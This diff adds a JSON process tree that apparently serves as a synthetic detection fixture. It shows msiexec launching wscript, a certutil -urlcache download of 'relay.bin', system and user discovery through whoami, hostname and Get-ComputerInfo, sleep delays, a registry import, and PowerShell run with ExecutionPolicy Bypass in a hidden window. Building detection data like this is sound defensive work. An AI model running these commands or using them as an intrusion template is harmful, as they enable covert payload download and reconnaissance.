@@ -1,0 +1,134 @@
+{
+  "pid": 194140,
+  "ppid": 0,
+  "name": "msiexec.exe",
+  "command": "msiexec.exe",
+  "children": [
+    {
+      "pid": 194145,
+      "ppid": 194140,
+      "name": "wscript.exe",
+      "command": "wscript.exe //nologo \"C:\\Users\\dev.jain\\AppData\\Local\\Temp\\LoginInit_a5f4d366.js\"",
+      "children": [
+        {
+          "pid": 194152,
+          "ppid": 194145,
+          "name": "certutil.exe",
+          "command": "certutil.exe -urlcache -split -f \"http://helpdesk-tools.corp.local/certs/workstation.cer\" \"C:\\ProgramData\\Wingtip\\Assist\\relay.bin\"",
+          "children": [
+            {
+              "pid": 194158,
+              "ppid": 194152,
+              "name": "hostname.exe",
+              "command": "hostname.exe > \"C:\\Users\\dev.jain\\AppData\\Local\\Temp\\host_9b05ecc4.txt\"",
+              "children": [
+                {
+                  "pid": 194160,
+                  "ppid": 194158,
+                  "name": "hostname.exe",
+                  "command": "hostname.exe",
+                  "children": [
+                    {
+                      "pid": 194164,
+                      "ppid": 194160,
+                      "name": "choice.exe",
+                      "command": "choice.exe /d y /t 20 > nul",
+                      "children": [
+                        {
+                          "pid": 194169,
+                          "ppid": 194164,
+                          "name": "certutil.exe",
+                          "command": "certutil.exe -verify \"C:\\Users\\Public\\vpn_gateway.cer\"",
+                          "children": [
+                            {
+                              "pid": 194176,
+                              "ppid": 194169,
+                              "name": "ping.exe",
+                              "command": "ping.exe -n 14 127.0.0.1 > nul",
+                              "children": [
+                                {
+                                  "pid": 194179,
+                                  "ppid": 194176,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe /all",
+                                  "children": [
+                                    {
+                                      "pid": 194181,
+                                      "ppid": 194179,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe",
+                                      "children": [
+                                        {
+                                          "pid": 194186,
+                                          "ppid": 194181,
+                                          "name": "whoami.exe",
+                                          "command": "whoami.exe /groups",
+                                          "children": []
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            },
+                            {
+                              "pid": 194190,
+                              "ppid": 194169,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /groups",
+                              "children": [
+                                {
+                                  "pid": 194197,
+                                  "ppid": 194190,
+                                  "name": "reg.exe",
+                                  "command": "reg.exe import \"C:\\ProgramData\\BlueYonder\\Build\\Runtime_cee7347c.reg\"",
+                                  "children": [
+                                    {
+                                      "pid": 194200,
+                                      "ppid": 194197,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe /all > \"C:\\Users\\dev.jain\\AppData\\Local\\Temp\\who_6e391e1d.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 194201,
+                                          "ppid": 194200,
+                                          "name": "whoami.exe",
+                                          "command": "whoami.exe /all",
+                                          "children": [
+                                            {
+                                              "pid": 194207,
+                                              "ppid": 194201,
+                                              "name": "powershell.exe",
+                                              "command": "powershell.exe -NoProfile -WindowStyle Minimized -ExecutionPolicy Bypass -Command \"Get-ComputerInfo | Out-File 'C:\\Users\\dev.jain\\AppData\\Local\\Temp\\diag_12d57923.txt'\"",
+                                              "children": [
+                                                {
+                                                  "pid": 194214,
+                                                  "ppid": 194207,
+                                                  "name": "powershell.exe",
+                                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 8\"",
+                                                  "children": []
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
